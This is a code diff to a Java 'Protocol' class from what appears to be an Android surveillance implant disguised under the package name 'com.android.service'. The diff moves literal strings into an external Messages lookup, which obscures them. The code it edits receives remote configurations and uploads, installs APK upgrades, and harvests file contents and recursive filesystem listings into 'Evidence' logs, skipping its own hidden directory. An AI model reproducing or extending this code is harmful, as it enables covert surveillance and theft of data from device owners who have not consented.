@@ -17,6 +17,7 @@ import android.content.Intent;
 import android.net.Uri;
 
 import com.android.service.LogR;
+import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.Configuration;
@@ -37,9 +38,9 @@ import com.android.service.util.WChar;
 public abstract class Protocol {
 
 	/** The Constant UPGRADE_FILENAME. */
-	public static final String UPGRADE_FILENAME = "core-update";
+	public static final String UPGRADE_FILENAME = Messages.getString("Protocol.0"); //$NON-NLS-1$
 	/** The debug. */
-	private static final String TAG = "Protocol";
+	private static final String TAG = "Protocol"; //$NON-NLS-1$
 	/** The transport. */
 	protected Transport transport;
 
@@ -89,7 +90,7 @@ public abstract class Protocol {
 		final AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);
 
 		if (file.write(conf, offset, false)) {
-			Evidence.info("New configuration received");
+			Evidence.info(Messages.getString("Protocol.1")); //$NON-NLS-1$
 			return true;
 		} else {
 			return false;
@@ -110,14 +111,14 @@ public abstract class Protocol {
 
 		if (file.exists()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " getUpload replacing existing file: " + filename);
+				Check.log(TAG + " getUpload replacing existing file: " + filename) ;//$NON-NLS-1$
 			}
 			file.delete();
 		}
 
 		file.write(content);
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " file written: " + file.exists());
+			Check.log(TAG + " file written: " + file.exists()) ;//$NON-NLS-1$
 		}
 	}
 
@@ -132,12 +133,12 @@ public abstract class Protocol {
 
 		for (final String fileName : files) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (upgradeMulti): " + fileName);
+				Check.log(TAG + " (upgradeMulti): " + fileName) ;//$NON-NLS-1$
 			}
 			final File file = new File(Path.upload(), fileName);
 
 			final Intent intent = new Intent(Intent.ACTION_VIEW);
-			intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
+			intent.setDataAndType(Uri.fromFile(file), Messages.getString("Protocol.2")); //$NON-NLS-1$
 			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 			Status.getAppContext().startActivity(intent);
 		}
@@ -166,14 +167,14 @@ public abstract class Protocol {
 		AutoFile file = new AutoFile(filefilter);
 		if (file.exists()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " logging file: " + filefilter);
+				Check.log(TAG + " logging file: " + filefilter) ;//$NON-NLS-1$
 			}
 			if (file.canRead()) {
 				saveFileLog(file, filefilter);
 			}
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " not a file, try to expand it: " + filefilter);
+				Check.log(TAG + " not a file, try to expand it: " + filefilter) ;//$NON-NLS-1$
 			}
 			final String[] files = file.list();
 			for (final String filename : files) {
@@ -185,7 +186,7 @@ public abstract class Protocol {
 
 				saveFileLog(file, filename);
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " logging file: " + filename);
+					Check.log(TAG + " logging file: " + filename) ;//$NON-NLS-1$
 				}
 			}
 		}
@@ -201,16 +202,16 @@ public abstract class Protocol {
 	 */
 	private static void saveFileLog(final AutoFile file, final String filename) {
 		if (Cfg.DEBUG) {
-			Check.requires(file != null, "null file");
+			Check.requires(file != null, "null file"); //$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.requires(file.exists(), "file should exist");
+			Check.requires(file.exists(), "file should exist"); //$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
+			Check.requires(!filename.endsWith("/"), "path shouldn't end with /"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 		if (Cfg.DEBUG) {
-			Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
+			Check.requires(!filename.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 		final byte[] content = file.read();
 		final byte[] additional = Protocol.logDownloadAdditional(filename);
@@ -231,19 +232,19 @@ public abstract class Protocol {
 	 */
 	private static byte[] logDownloadAdditional(String filename) {
 		if (Cfg.DEBUG) {
-			Check.requires(filename != null, "null file");
+			Check.requires(filename != null, "null file"); //$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
+			Check.requires(!filename.endsWith("/"), "path shouldn't end with /"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 		if (Cfg.DEBUG) {
-			Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
+			Check.requires(!filename.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
-		final String path = Utils.chomp(Path.hidden(), "/"); // UPLOAD_DIR
+		final String path = Utils.chomp(Path.hidden(), "/"); // UPLOAD_DIR //$NON-NLS-1$
 		final int macroPos = filename.indexOf(path);
 		if (macroPos >= 0) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " macropos: " + macroPos);
+				Check.log(TAG + " macropos: " + macroPos) ;//$NON-NLS-1$
 			}
 			final String start = filename.substring(0, macroPos);
 			final String end = filename.substring(macroPos + path.length());
@@ -251,7 +252,7 @@ public abstract class Protocol {
 			filename = start + Directory.hiddenDirMacro + end;
 		}
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " filename: " + filename);
+			Check.log(TAG + " filename: " + filename) ;//$NON-NLS-1$
 		}
 		final int version = 2008122901;
 		final byte[] wfilename = WChar.getBytes(filename);
@@ -278,25 +279,25 @@ public abstract class Protocol {
 		final Evidence fsLog = new Evidence(EvidenceType.FILESYSTEM);
 		if (!fsLog.createEvidence(null, EvidenceType.FILESYSTEM)) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveFilesystem) Error: cannot create evidence");
+				Check.log(TAG + " (saveFilesystem) Error: cannot create evidence") ;//$NON-NLS-1$
 			}
 			return;
 		}
 
 		// Expand path and create log
-		if (path.equals("/")) {
+		if (path.equals("/")) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " sendFilesystem: root");
+				Check.log(TAG + " sendFilesystem: root") ;//$NON-NLS-1$
 			}
 			expandRoot(fsLog, depth);
 		} else {
-			if (path.startsWith("//") && path.endsWith("/*")) {
+			if (path.startsWith("//") && path.endsWith("/*")) { //$NON-NLS-1$ //$NON-NLS-2$
 				path = path.substring(1, path.length() - 2);
 
 				expandPath(fsLog, path, depth);
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error: sendFilesystem: strange path, ignoring it. " + path);
+					Check.log(TAG + " Error: sendFilesystem: strange path, ignoring it. " + path) ;//$NON-NLS-1$
 				}
 			}
 		}
@@ -314,10 +315,10 @@ public abstract class Protocol {
 	 */
 	private static void expandRoot(final Evidence fsLog, final int depth) {
 		if (Cfg.DEBUG) {
-			Check.requires(depth > 0, "wrong recursion depth");
+			Check.requires(depth > 0, "wrong recursion depth"); //$NON-NLS-1$
 		}
 		saveRootLog(fsLog); // depth 0
-		expandPath(fsLog, "/", depth);
+		expandPath(fsLog, "/", depth); //$NON-NLS-1$
 
 	}
 
@@ -332,23 +333,23 @@ public abstract class Protocol {
 	 */
 	private static boolean saveFilesystemLog(final Evidence fsLog, final String filepath) {
 		if (Cfg.DEBUG) {
-			Check.requires(fsLog != null, "fsLog null");
+			Check.requires(fsLog != null, "fsLog null"); //$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.requires(!filepath.endsWith("/"), "path shouldn't end with /");
+			Check.requires(!filepath.endsWith("/"), "path shouldn't end with /"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 		if (Cfg.DEBUG) {
-			Check.requires(!filepath.endsWith("*"), "path shouldn't end with *");
+			Check.requires(!filepath.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " Info: save FilesystemLog: " + filepath);
+			Check.log(TAG + " Info: save FilesystemLog: " + filepath) ;//$NON-NLS-1$
 		}
 		final int version = 2010031501;
 
 		final AutoFile file = new AutoFile(filepath);
 		if (!file.exists()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: non existing file: " + filepath);
+				Check.log(TAG + " Error: non existing file: " + filepath) ;//$NON-NLS-1$
 			}
 			return false;
 		}
@@ -380,7 +381,7 @@ public abstract class Protocol {
 
 		fsLog.writeEvidence(content);
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " expandPath: written log");
+			Check.log(TAG + " expandPath: written log") ;//$NON-NLS-1$
 		}
 		return isDir;
 
@@ -396,7 +397,7 @@ public abstract class Protocol {
 	private static void saveRootLog(final Evidence fsLog) {
 		final int version = 2010031501;
 		if (Cfg.DEBUG) {
-			Check.requires(fsLog != null, "fsLog null");
+			Check.requires(fsLog != null, "fsLog null"); //$NON-NLS-1$
 		}
 		final byte[] content = new byte[30];
 
@@ -406,7 +407,7 @@ public abstract class Protocol {
 		databuffer.writeInt(1); // flags
 		databuffer.writeLong(0);
 		databuffer.writeLong(DateTime.getFiledate(new Date()));
-		databuffer.write(WChar.getBytes("/"));
+		databuffer.write(WChar.getBytes("/")); //$NON-NLS-1$
 		fsLog.writeEvidence(content);
 	}
 
@@ -423,19 +424,19 @@ public abstract class Protocol {
 	 */
 	private static void expandPath(final Evidence fsLog, final String path, final int depth) {
 		if (Cfg.DEBUG) {
-			Check.requires(depth > 0, "wrong recursion depth");
+			Check.requires(depth > 0, "wrong recursion depth"); //$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.requires(path != null, "path==null");
+			Check.requires(path != null, "path==null"); //$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.requires(path == "/" || !path.endsWith("/"), "path should end with /");
+			Check.requires(path == "/" || !path.endsWith("/"), "path should end with /"); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 		}
 		if (Cfg.DEBUG) {
-			Check.requires(!path.endsWith("*"), "path shouldn't end with *");
+			Check.requires(!path.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " expandPath: " + path + " depth: " + depth);
+			Check.log(TAG + " expandPath: " + path + " depth: " + depth) ;//$NON-NLS-1$ //$NON-NLS-2$
 		}
 		final File dir = new File(path);
 		if (dir.isDirectory()) {
@@ -444,13 +445,13 @@ public abstract class Protocol {
 				return;
 			}
 			for (final String file : files) {
-				String dPath = path + "/" + file;
-				if (dPath.startsWith("//")) {
+				String dPath = path + "/" + file; //$NON-NLS-1$
+				if (dPath.startsWith("//")) { //$NON-NLS-1$
 					dPath = dPath.substring(1);
 				}
-				if (dPath.indexOf(Utils.chomp(Path.hidden(), "/")) >= 0) {
+				if (dPath.indexOf(Utils.chomp(Path.hidden(), "/")) >= 0) { //$NON-NLS-1$
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " Warn: " + "expandPath ignoring hidden path: " + dPath);
+						Check.log(TAG + " Warn: " + "expandPath ignoring hidden path: " + dPath) ;//$NON-NLS-1$ //$NON-NLS-2$
 					}
 					continue;
 				}
@@ -472,9 +473,9 @@ public abstract class Protocol {
 	 * @return the string
 	 */
 	public static String normalizeFilename(final String file) {
-		if (file.startsWith("//")) {
+		if (file.startsWith("//")) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " normalizeFilename: " + file);
+				Check.log(TAG + " normalizeFilename: " + file) ;//$NON-NLS-1$
 			}
 			return file.substring(1);
 		} else {
